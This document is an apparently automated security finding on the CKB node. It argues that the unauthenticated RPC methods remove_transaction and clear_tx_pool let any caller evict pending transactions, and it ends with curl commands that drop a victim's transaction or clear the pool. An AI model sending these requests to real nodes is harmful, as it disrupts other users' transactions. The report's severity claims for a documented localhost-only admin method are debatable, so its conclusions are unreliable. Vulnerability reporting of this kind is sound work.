### Title
Any RPC Caller Can Remove Arbitrary Pending Transactions or Clear the Entire Tx-Pool Without Authentication — (`rpc/src/module/pool.rs`)

### Summary

The CKB JSON-RPC server has no application-level authentication mechanism. The `remove_transaction` and `clear_tx_pool` RPC methods are callable by any RPC caller without any credential check. An unprivileged caller who can reach the RPC endpoint can silently evict any specific pending transaction — or the entire pool — from the node, causing the node's mempool state to diverge from what transaction submitters expect, with no recourse other than resubmission.

### Finding Description

**Root cause — no authentication in the RPC server**

`rpc/src/server.rs` builds the HTTP/WS/TCP server with `CorsLayer::permissive()` and no authentication middleware. Every incoming JSON-RPC call is dispatched directly to the handler:

```rust
// rpc/src/server.rs ~line 119-129
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← no auth, all origins allowed
    ...
```

There is no token, session, IP-allowlist, or any other caller-identity check at the application layer.

**Unprotected state-mutating methods**

`rpc/src/module/pool.rs` exposes two methods that irreversibly mutate the mempool:

1. `remove_transaction(tx_hash)` — removes the named transaction **and all descendants** from the pool:

```rust
// rpc/src/module/pool.rs:662-669
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

2. `clear_tx_pool()` — atomically drops every transaction in the pool:

```rust
// rpc/src/module/pool.rs:684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

Neither method checks the identity of the caller. The caller supplies the target (`tx_hash`) and the node executes the removal unconditionally.

**Caller-controlled parameter maps directly to impact**

The caller fully controls `tx_hash`. By supplying the hash of a victim's pending transaction, the attacker causes the node to silently drop it (and all child transactions). The submitter's view of the world ("my tx is pending") diverges from the node's actual state — a direct analog to the cross-chain delegate-cancel pattern in the reference report.

### Impact Explanation

- **Targeted transaction eviction**: An attacker can remove any specific pending transaction (e.g., a high-value DeFi operation, a time-sensitive unlock, or a fee-bumping RBF replacement) before it is proposed or committed. The submitter must detect the eviction and resubmit, potentially at a higher fee or after a missed time window.
- **Full pool wipe**: `clear_tx_pool` removes every pending and proposed transaction simultaneously. All in-flight transactions across all users of the node are lost. Miners lose fee revenue; users lose ordering priority.
- **State divergence**: After eviction, the node's mempool state is inconsistent with what the submitter believes. If the submitter relies on the pending state (e.g., chained transactions, UTXO-style cell chains), downstream transactions become orphaned and unresolvable until the parent is resubmitted and re-proposed.

### Likelihood Explanation

The RPC binds to `127.0.0.1:8114` by default, but:

1. The documentation explicitly acknowledges that operators expose the port to external networks ("Allowing arbitrary machines to access the JSON-RPC port is **dangerous and strongly discouraged**" — `rpc/README.md:5`, `resource/ckb.toml:178-181`). This warning exists precisely because it is common practice.
2. The `Pool` module is enabled by default in the standard `modules` list (`resource/ckb.toml:190`), so `remove_transaction` and `clear_tx_pool` are live on any standard node.
3. Any process running on the same host (e.g., a malicious script, a compromised co-located service, or a SSRF vulnerability in a web app fronting the node) can reach `127.0.0.1:8114` without any credential.
4. The attacker profile "RPC caller" is explicitly in scope per the prompt.

### Recommendation

1. **Add application-level authentication** to the RPC server (e.g., HTTP Basic Auth token configured in `ckb.toml`), enforced as an Axum middleware layer before any handler is reached.
2. **Restrict destructive pool methods** (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`) to an authenticated operator role, separate from read-only or submit-only roles.
3. **Do not rely solely on network binding** as the access control boundary; defense-in-depth requires application-layer authentication for state-mutating endpoints.

### Proof of Concept

**Step 1** — Victim submits a transaction:
```bash
curl -X POST http://<node>:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[<tx_json>,"passthrough"],"id":1}'
# Returns: {"result": "0xabc...def"}  ← tx_hash
```

**Step 2** — Attacker (any caller who can reach the RPC) removes it:
```bash
curl -X POST http://<node>:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0xabc...def"],"id":2}'
# Returns: {"result": true}
```

**Step 3** — Victim's transaction is gone; `tx_pool_info` shows `pending: 0`. The victim's downstream chained transactions (if any) are now orphaned. No error is surfaced to the victim; the node silently accepted the removal.

**For full pool wipe**, replace Step 2 with:
```bash
curl -X POST http://<node>:8114 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
```

All pending and proposed transactions across all users are dropped atomically with no authentication required. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/README.md (L1-9)
```markdown
# CKB JSON-RPC Protocols

The RPC interface shares the version of the node version, which is returned in `local_node_info`. The interface is fully compatible between patch versions, for example, a client for 0.25.0 should work with 0.25.x for any x.

Allowing arbitrary machines to access the JSON-RPC port (using the `rpc.listen_address` configuration option) is **dangerous and strongly discouraged**. Please strictly limit the access to only trusted machines.

CKB JSON-RPC only supports HTTP now. If you need SSL, please set up a proxy via Nginx or other HTTP servers.

See [list of projects](https://github.com/topics/ckb-rpc-proxy) to setup the proxy for the RPC server.
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
